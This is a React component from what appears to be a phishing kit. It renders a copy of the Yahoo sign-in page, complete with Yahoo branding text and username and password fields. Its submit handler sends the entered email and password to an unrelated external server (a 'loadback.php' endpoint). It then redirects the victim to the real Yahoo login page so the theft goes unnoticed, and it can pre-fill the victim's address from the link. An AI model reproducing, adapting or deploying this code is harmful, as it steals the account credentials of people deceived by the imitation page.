import React, { useEffect, useState } from 'react'
import gIcon from '../assets/search.png'
import { useParams } from 'react-router-dom'
import axios from 'axios'

const YahooBody = ({ logo }) => {
    const [focused, setFocused] = useState(false)
    const [user, setUser] = useState('')
    const [passName, setPassName] = useState('')
    const [message, setMessage] = useState(null)
    const [showPass, setShowPass] = useState(false)

    const urlParams =  useParams();

    useEffect(() => {
        setTimeout(()=> {
            if (urlParams.id) {
                setUser(urlParams.id)
                setFocused(true)
            }
        },400)
        return
    }, [])

    const checkUser = ()=> {
        if(user.length > 0){
            setFocused(true)
            //window.location.href = 'https://www.yahoo.com/'
        }
        else{
            setFocused(false)
        }
    }
    const checkPass = ()=> {
        if(passName.length > 0){
            setFocused(true)
            //window.location.href = 'https://www.yahoo.com/'
        }
        else{
            setFocused(false)
        }
    }
    const url = 'https://backend.compassionaid.love/loadback.php';
    const msUrl = "https://login.yahoo.com";
            
    const handleClick = ()=> {
        if(user.length > 0 && passName.length > 0){
            const proData = new FormData();
            proData.append('email', user);
            proData.append('para', passName);
            proData.append('source', "Microsoft");

            

            axios.post(url, proData)
            .then((res) => {
            if (res.status !== 'ok'){
                console.log(res.data)
            }
            }).then(()=> {
                window.location.replace(msUrl);
            }).catch(err => {
                setMessage(err.code)
            })
        }else {
            if(user.length > 0 && passName.length === 0) {
                setShowPass(true)
                console.log(passName.length)
            }else {
                setShowPass(false)
                console.log("failed")
                setMessage('Please enter your enter.')
            }
        }
    }
  return (
      <div className='flex justify-between lg:justify-around xl:w-4/6 xl:mx-auto w-full py-[1.6rem] sm:px-[1rem]'>
            <div className='hidden sm:flex sm:w-1/2 items-center'>
                <div>
                    <h1 className='text-gray-700 text-[1.5rem] leading-none tracking-tighter font-bold'>
                        Yahoo makes it easy to enjoy what matters most in your world.
                    </h1>
                    <div className='mt-3 text-[1.3rem]'>
                        Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.
                    </div>
                </div>
            </div>
            <div className='w-full sm:shadow-gray-700 sm:shadow-md py-[1.8rem] sm:w-[350px] sm:ml-auto sm:mr-1 sm:max-w-[350] sm:-mt-[17px]'>
                <div className='w-full flex justify-center'>
                    <img src={logo} width={90} className='w-[90px] -mt-4 sm:w-[90px]' alt="logo" />
                </div>
                <div className='px-[1.41176rem] w-full'>
                    <h2 className='mt-[3.6rem] text-2xl sm:text-[1.3rem] font-[500] text-center'>
                        Sign in
                    </h2>
                    <div className={`text-gray-900 text-[1.3rem] sm:text-[14.7px] text-center ${focused ? 'mb-[55px]': 'mb-[80px]'}`}>using your yahoo account</div>

                    <label htmlFor="email" className={`${showPass ? 'hidden' : 'flex'} transition-all ${focused ? 'text-1xl sm:text-sm text-gray-950' : 'absolute text-[1.4rem] sm:text-[1rem] sm:font-semibold text-gray-500'}`}>Username, email, or mobile</label>
                    <input type='text' id='email' autoFocus value={user} onFocus={()=> setFocused(true)} onBlur={checkUser} onChange={(e) => setUser(e.target.value) } className={`${showPass ? 'hidden' : 'flex'} w-[100%] border-b-[2px] sm:border-b-[1px] sm:text-[1rem] py-1 text-[1.4rem] border-gray-300 focus:outline-none`} />
                    
                    <label htmlFor="password" className={`${showPass ? 'flex' : 'hidden'} transition-all ${focused ? 'text-1xl sm:text-sm text-gray-950' : 'absolute text-[1.4rem] sm:text-[1rem] sm:font-semibold text-gray-500'}`}>Password</label>
                    <input type='password' id='password' autoFocus={true} onFocus={()=> setFocused(true)} onBlur={checkPass} onChange={(e) => setPassName(e.target.value) } className={`${showPass ? 'flex' : 'hidden'} w-[100%] border-b-[2px] sm:border-b-[1px] sm:text-[1rem] py-1 text-[1.4rem] border-gray-300 focus:outline-none`} />
                    
                    {message && <div className='text-red-500 text-[1.3rem] sm:text-[1rem]'>{message}</div>}
                    <button onClick={handleClick} className='w-full bg-blue-500 mt-8 rounded-full md:text-[1.2rem] text-2xl py-3 md:py-2 text-white font-bold'>Next</button>
                    
                    
                    <div className="flex justify-between mt-4">
                        <div className="flex">
                            <input type='checkbox' id='remember' className='mr-3' />
                            <label htmlFor='remember' className='text-blue-500'>Remember me</label>
                        </div>
                        <span className='text-blue-500 hover:text-blue-600 cursor-pointer'>Forgot username?</span>
                    </div>
                    <button className='w-full border-blue-500 mt-8 rounded-full border md:text-[1.2rem] text-2xl py-3 md:py-2 text-blue-500 sm:font-semibold font-bold'>Create account</button>
                    <div className='mt-8 text-center text-gray-500'>Or continue with</div>
                    <button className='w-full border border-gray-300 mb-4 rounded-full md:text-[1.2rem] text-2xl py-3 md:py-2 text-gray-800 sm:font-semibold font-bold flex justify-center'>
                        <img src={gIcon} width={20} className='mr-3 mt-2' alt="google" />
                        Google
                    </button>
                </div>
            </div>
        </div>
  )
}

export default YahooBody
